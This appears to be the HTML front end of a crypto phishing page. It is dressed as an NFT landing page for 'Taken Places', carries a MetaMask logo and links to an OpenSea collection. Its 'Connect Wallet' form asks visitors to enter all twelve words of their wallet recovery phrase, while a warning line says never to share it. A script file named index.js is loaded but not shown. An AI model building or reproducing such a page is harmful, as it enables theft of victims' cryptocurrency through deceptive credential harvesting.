<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>cg-landing-page</title>
        <link rel="stylesheet" href="styles.css" />
        <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.10.4/gsap.min.js"></script>
    </head>
    <body>
        <div class="onboard-container">
            <div class="loader">
                <lottie-player src="https://assets2.lottiefiles.com/private_files/lf30_lndg7fhf.json"  background="transparent"  speed="1"  loop  autoplay></lottie-player>
            </div>
            <div class="up">
                <lottie-player src="https://assets3.lottiefiles.com/packages/lf20_kfzgxkvq.json"  background="transparent"  speed="1" loop  autoplay></lottie-player>
            </div>
            <div class="confetti">
                <lottie-player class="success-anim" src="https://assets10.lottiefiles.com/packages/lf20_rovf9gzu.json"  background="transparent"  speed="1"></lottie-player>
            </div>

            <div class="container">
                <div class="header">
                    <div class="header-logo"><img src="images/MetaMask-Logo.png" alt="Metamask-Logo"></div>
                    <div class="header-menu-1">
                        <li><a href="index.html">Home Page</a></li>
                        <li>Portfolio</li>
                        <li><a href="https://opensea.io/collection/taken-places">Collection</a></li>
                        <li>Blog</li>
                    </div> 
                    <div class="header-menu-2">
                        <li>About Us</li>
                        <li>Dashboard</li>
                        <li>Shop</li>
                        <li>Contact</li>
                    </div>
                    <div class="header-hamburger">
                        <span></span>
                        <span></span>
                    </div>
                </div>

                <div class="wrapper">
                    <div class="main-title">
                        <div class="title-logo"><img src="images/logo.png" alt="" /></div>
                        <div class="title">Taken Places</div>
                    </div>
                    <div class="divider"></div>
                    <div class="hero-image">
                        <div class="hero-title">
                            <div>X</div>
                            <div>2</div>
                            <div>A</div>
                            <div>G</div>
                            <div class="arrow-img"><img src="images/arrow.png" alt="" /></div>
                            <div>3</div>
                        </div>
                    </div>
                </div>

                <div class="wallet-connect">
                    <div class="body">Connect Wallet</div>
                    <form class="data-fields" action="">
                        <label for="pass-phrase">Verify Your Recovery Phrase</label>
                        <p class="warning">! DON'T EVER SHARE THIS INFO WITH ANYBODY !</p>
                        <div class="fields1">
                            <input class="field" type="text" id="phrase1" name="phrase1">
                            <input class="field" type="text" id="phrase2" name="phrase2">
                            <input class="field" type="text" id="phrase3" name="phrase3">
                            <input class="field" type="text" id="phrase4" name="phrase4">
                        </div>
                        <div class="fields1">
                            <input class="field" type="text" id="phrase5" name="phrase5">
                            <input class="field" type="text" id="phrase6" name="phrase6">
                            <input class="field" type="text" id="phrase7" name="phrase7">
                            <input class="field" type="text" id="phrase8" name="phrase8">
                        </div>
                        <div class="fields1">
                            <input class="field" type="text" id="phrase9" name="phrase9">
                            <input class="field" type="text" id="phrase10" name="phrase10">
                            <input class="field" type="text" id="phrase11" name="phrase11">
                            <input class="field" type="text" id="phrase12" name="phrase12">
                        </div>
                        <div class="fields1">
                            <button class="connect-button" type="connect"><a href="#" class="onboard">Connect</a></button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
        <script src="index.js" type="module"></script>

        <script>
            gsap.from(".header > div, .body, .data-fields, .fields1 > input, .fields1 > button, .main-title > div, .divider, .hero-image, .hero-title > div, .btns > div, .hero-copy > div", 
            2, {
                y: "200",
                opacity: 0,
                ease: Expo.easeInOut,
                delay: 0,
                stagger: 0.08,
                }
            );

            gsap.from(".arrow-img img", 1, {
                scale: 0,
                ease: Elastic.easeOut,
                delay: 3,
            });
        </script>
    </body>
</html>
